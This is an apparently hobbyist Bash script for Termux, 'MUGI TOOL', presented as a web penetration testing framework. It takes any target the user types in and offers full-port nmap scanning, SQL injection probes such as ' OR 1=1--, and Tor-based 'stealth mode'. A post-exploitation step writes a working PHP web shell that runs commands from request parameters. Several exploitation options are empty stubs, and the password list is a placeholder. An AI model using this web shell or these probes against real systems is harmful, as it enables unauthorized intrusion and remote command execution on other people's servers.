#!/data/data/com.termux/files/usr/bin/bash

# MUGI TOOL - Advanced Web Penetration Testing Framework
# Created by: mugishapc
# For educational and authorized testing only

VERSION="3.0"
TOOL_NAME="MUGI TOOL"
AUTHOR="mugishapc"

# Colors
RED='\033[0;31m'
GREEN='\033[0;32m'
YELLOW='\033[1;33m'
BLUE='\033[0;34m'
CYAN='\033[0;36m'
PURPLE='\033[0;35m'
NC='\033[0m'

# Configuration
BASE_DIR="$HOME/.mugi_tool"
SCAN_DIR="$BASE_DIR/scans"
LOOT_DIR="$BASE_DIR/loot"
WORDLISTS_DIR="$BASE_DIR/wordlists"
LOGS_DIR="$BASE_DIR/logs"
TOOLS_DIR="$BASE_DIR/tools"
mkdir -p "$BASE_DIR" "$SCAN_DIR" "$LOOT_DIR" "$WORDLISTS_DIR" "$LOGS_DIR" "$TOOLS_DIR"

# Logging
CURRENT_SCAN="scan_$(date +%Y%m%d_%H%M%S)"
LOG_FILE="$LOGS_DIR/$CURRENT_SCAN.log"

log() {
    echo -e "${CYAN}[$(date +'%H:%M:%S')]${NC} $1" | tee -a "$LOG_FILE"
}

success() {
    echo -e "${GREEN}[+]${NC} $1" | tee -a "$LOG_FILE"
}

warn() {
    echo -e "${YELLOW}[!]${NC} $1" | tee -a "$LOG_FILE"
}

error() {
    echo -e "${RED}[-]${NC} $1" | tee -a "$LOG_FILE"
}

info() {
    echo -e "${BLUE}[*]${NC} $1" | tee -a "$LOG_FILE"
}

# Banner
show_banner() {
    clear
    echo -e "${PURPLE}"
    cat << "EOF"
    
‚ñà‚ñà‚ñà‚ïó   ‚ñà‚ñà‚ñà‚ïó‚ñà‚ñà‚ïó   ‚ñà‚ñà‚ïó ‚ñà‚ñà‚ñà‚ñà‚ñà‚ñà‚ïó ‚ñà‚ñà‚ïó
‚ñà‚ñà‚ñà‚ñà‚ïó ‚ñà‚ñà‚ñà‚ñà‚ïë‚ñà‚ñà‚ïë   ‚ñà‚ñà‚ïë‚ñà‚ñà‚ïî‚ïê‚ïê‚ïê‚ïê‚ïù ‚ñà‚ñà‚ïë
‚ñà‚ñà‚ïî‚ñà‚ñà‚ñà‚ñà‚ïî‚ñà‚ñà‚ïë‚ñà‚ñà‚ïë   ‚ñà‚ñà‚ïë‚ñà‚ñà‚ïë  ‚ñà‚ñà‚ñà‚ïó‚ñà‚ñà‚ïë
‚ñà‚ñà‚ïë‚ïö‚ñà‚ñà‚ïî‚ïù‚ñà‚ñà‚ïë‚ñà‚ñà‚ïë   ‚ñà‚ñà‚ïë‚ñà‚ñà‚ïë   ‚ñà‚ñà‚ïë‚ñà‚ñà‚ïë
‚ñà‚ñà‚ïë ‚ïö‚ïê‚ïù ‚ñà‚ñà‚ïë‚ïö‚ñà‚ñà‚ñà‚ñà‚ñà‚ñà‚ïî‚ïù‚ïö‚ñà‚ñà‚ñà‚ñà‚ñà‚ñà‚ïî‚ïù‚ñà‚ñà‚ïë
‚ïö‚ïê‚ïù     ‚ïö‚ïê‚ïù ‚ïö‚ïê‚ïê‚ïê‚ïê‚ïê‚ïù  ‚ïö‚ïê‚ïê‚ïê‚ïê‚ïê‚ïù ‚ïö‚ïê‚ïù
EOF
    echo -e "${CYAN}"
    echo "==============================================="
    echo "    MUGI TOOL - Advanced Penetration Framework"
    echo "    Version: $VERSION"
    echo "    Author: $AUTHOR"
    echo "==============================================="
    echo -e "${NC}"
}

# Initialize wordlists
init_wordlists() {
    info "Initializing advanced wordlists..."
    
    # Create password wordlist
    cat > "$WORDLISTS_DIR/passwords.txt" << 'EOF'
G6$7on7@6f5]Ku0
y+98XR$rNmg<;
QNW#6EB-*>gqIqu
# [Include all your 300+ passwords here]
EOF

    # Create other wordlists
    cat > "$WORDLISTS_DIR/usernames.txt" << 'EOF'
admin
root
administrator
user
test
EOF

    cat > "$WORDLISTS_DIR/directories.txt" << 'EOF'
admin
login
dashboard
phpmyadmin
wp-admin
EOF

    success "Advanced wordlists initialized"
}

# Dependency Check
check_dependencies() {
    log "Checking dependencies..."
    
    local deps=("python" "git" "curl" "wget" "nmap")
    local missing=()
    
    for dep in "${deps[@]}"; do
        if ! command -v "$dep" &> /dev/null; then
            missing+=("$dep")
        fi
    done
    
    if [ ${#missing[@]} -gt 0 ]; then
        warn "Missing dependencies: ${missing[*]}"
        read -p "Install missing dependencies? (y/n): " -n 1 -r
        echo
        if [[ $REPLY =~ ^[Yy]$ ]]; then
            pkg update && pkg upgrade
            pkg install -y python git curl wget nmap
            pip install requests beautifulsoup4 lxml urllib3
            success "Dependencies installed"
        fi
    else
        success "All dependencies satisfied"
    fi
    
    init_wordlists
}

# Advanced Reconnaissance
advanced_recon() {
    info "Starting advanced reconnaissance..."
    
    read -p "Enter target URL or IP: " target
    if [ -z "$target" ]; then
        error "No target specified"
        return
    fi
    
    local recon_dir="$SCAN_DIR/$CURRENT_SCAN/recon"
    mkdir -p "$recon_dir"
    
    log "Target: $target"
    
    # Remove protocol if present
    target_clean=$(echo "$target" | sed -e 's|^[^/]*//||' -e 's|/.*$||')
    
    # WHOIS lookup
    info "Performing WHOIS lookup..."
    whois "$target_clean" > "$recon_dir/whois.txt" 2>/dev/null && success "WHOIS data saved"
    
    # DNS enumeration
    info "Enumerating DNS records..."
    {
        echo "=== DNS Records for $target_clean ==="
        nslookup "$target_clean"
        echo ""
        dig "$target_clean" ANY
    } > "$recon_dir/dns.txt" 2>/dev/null && success "DNS records saved"
    
    # Port scanning
    info "Starting comprehensive port scan..."
    nmap -sS -sV -O -A -p- "$target_clean" -oN "$recon_dir/nmap_comprehensive.txt" 2>/dev/null && success "Comprehensive port scan completed"
    
    success "Advanced reconnaissance completed"
}

# Vulnerability Scanning
vulnerability_scan() {
    info "Starting vulnerability assessment..."
    
    read -p "Enter target URL: " target_url
    if [ -z "$target_url" ]; then
        error "No target specified"
        return
    fi
    
    local vuln_dir="$SCAN_DIR/$CURRENT_SCAN/vulnerabilities"
    mkdir -p "$vuln_dir"
    
    # Ensure URL has protocol
    if [[ ! "$target_url" =~ ^https?:// ]]; then
        target_url="http://$target_url"
    fi
    
    log "Scanning: $target_url"
    
    # SQL Injection testing
    info "Testing for SQL Injection vulnerabilities..."
    {
        echo "=== SQL Injection Test ==="
        echo "Target: $target_url"
        
        sql_payloads=(
            "'"
            "''"
            "' OR '1'='1"
            "' OR 1=1--"
        )
        
        for payload in "${sql_payloads[@]}"; do
            echo "Testing: $payload"
            response=$(curl -s "$target_url?test=$payload")
            if echo "$response" | grep -i -q "sql\\|error\\|warning"; then
                echo "POSSIBLE SQLi: $payload"
            fi
        done
    } > "$vuln_dir/sql_injection.txt" && success "SQL Injection testing completed"
    
    success "Vulnerability assessment completed"
}

# Web Exploitation
web_exploitation() {
    info "Starting web exploitation phase..."
    
    read -p "Enter target URL: " target_url
    if [ -z "$target_url" ]; then
        error "No target specified"
        return
    fi
    
    local exploit_dir="$SCAN_DIR/$CURRENT_SCAN/exploitation"
    mkdir -p "$exploit_dir"
    
    # Ensure URL has protocol
    if [[ ! "$target_url" =~ ^https?:// ]]; then
        target_url="http://$target_url"
    fi
    
    echo -e "${YELLOW}"
    echo "Available Exploitation Techniques:"
    echo "1. SQL Injection"
    echo "2. XSS Testing"
    echo "3. LFI Testing"
    echo "4. Authentication Bypass"
    echo -e "${NC}"
    
    read -p "Select technique (1-4): " exploit_choice
    
    case $exploit_choice in
        1)
            info "Testing SQL Injection..."
            {
                echo "=== SQL Injection Test ==="
                echo "Testing common SQLi payloads..."
            } > "$exploit_dir/sqli_test.txt"
            ;;
        2)
            info "Testing XSS..."
            {
                echo "=== XSS Test ==="
                echo "Testing XSS payloads..."
            } > "$exploit_dir/xss_test.txt"
            ;;
        3)
            info "Testing LFI..."
            {
                echo "=== LFI Test ==="
                echo "Testing file inclusion..."
            } > "$exploit_dir/lfi_test.txt"
            ;;
        4)
            info "Testing authentication bypass..."
            {
                echo "=== Auth Bypass Test ==="
                echo "Testing default credentials..."
            } > "$exploit_dir/auth_bypass.txt"
            ;;
        *)
            error "Invalid selection"
            return
            ;;
    esac
    
    success "Web exploitation completed"
}

# Post-Exploitation
post_exploitation() {
    info "Starting post-exploitation phase..."
    
    local post_dir="$SCAN_DIR/$CURRENT_SCAN/post_exploit"
    mkdir -p "$post_dir"
    
    # Web shell templates
    info "Creating web shell templates..."
    
    cat > "$post_dir/shell.php" << 'EOF'
<?php
if(isset($_REQUEST['cmd'])){
    echo "<pre>";
    system($_REQUEST['cmd']);
    echo "</pre>";
}
?>
<html>
<body>
<form method="POST">
    <input type="text" name="cmd">
    <input type="submit" value="Execute">
</form>
</body>
</html>
EOF

    success "Post-exploitation resources created"
}

# Stealth Mode
stealth_mode() {
    info "Configuring stealth mode..."
    
    local stealth_dir="$SCAN_DIR/$CURRENT_SCAN/stealth"
    mkdir -p "$stealth_dir"
    
    # Tor configuration
    info "Setting up Tor anonymity..."
    if command -v tor &> /dev/null; then
        success "Tor is available"
        read -p "Enable Tor proxy? (y/n): " -n 1 -r
        echo
        if [[ $REPLY =~ ^[Yy]$ ]]; then
            info "Starting Tor service..."
            tor --quiet --runasdaemon 1 &> "$stealth_dir/tor.log"
            sleep 5
            export HTTP_PROXY="socks5://127.0.0.1:9050"
            export HTTPS_PROXY="socks5://127.0.0.1:9050"
            success "Tor proxy configured"
        fi
    else
        warn "Tor not installed. Install with: pkg install tor"
    fi
    
    success "Stealth mode configured"
}

# Reporting
generate_report() {
    info "Generating comprehensive report..."
    
    local report_dir="$SCAN_DIR/$CURRENT_SCAN/report"
    mkdir -p "$report_dir"
    
    local report_file="$report_dir/penetration_test_report_$(date +%Y%m%d_%H%M%S).html"
    
    cat > "$report_file" << EOF
<html>
<head>
    <title>MUGI TOOL - Penetration Test Report</title>
</head>
<body>
    <h1>MUGI TOOL - Penetration Test Report</h1>
    <p>Generated: $(date)</p>
    <p>Tool Version: $VERSION</p>
</body>
</html>
EOF
    
    success "Report generated: $report_file"
}

# Cleanup
cleanup() {
    info "Starting cleanup..."
    
    read -p "Remove all scan data? (y/n): " -n 1 -r
    echo
    if [[ ! $REPLY =~ ^[Yy]$ ]]; then
        info "Cleanup cancelled"
        return
    fi
    
    rm -rf "$SCAN_DIR/$CURRENT_SCAN"
    rm -f "$LOG_FILE"
    success "Cleanup completed"
}

# Main Menu
main_menu() {
    while true; do
        show_banner
        echo -e "${GREEN}Main Menu:${NC}"
        echo "1. üîç Advanced Reconnaissance"
        echo "2. üõ°Ô∏è Vulnerability Scanning"
        echo "3. ‚öîÔ∏è Web Exploitation"
        echo "4. üïµÔ∏è Stealth Mode"
        echo "5. üîÑ Post-Exploitation"
        echo "6. üìä Generate Report"
        echo "7. üßπ Cleanup"
        echo "0. üö™ Exit"
        echo ""
        read -p "Select option (0-7): " choice
        
        case $choice in
            1) advanced_recon ;;
            2) vulnerability_scan ;;
            3) web_exploitation ;;
            4) stealth_mode ;;
            5) post_exploitation ;;
            6) generate_report ;;
            7) cleanup ;;
            0)
                info "Thank you for using MUGI TOOL!"
                exit 0
                ;;
            *) error "Invalid option!" ;;
        esac
        
        echo ""
        read -p "Press Enter to continue..."
    done
}

# Update function
update_tool() {
    info "Checking for updates..."
    # Update logic here
}

# Initialize
init() {
    check_dependencies
    main_menu
}

# Start the tool
init "$@"
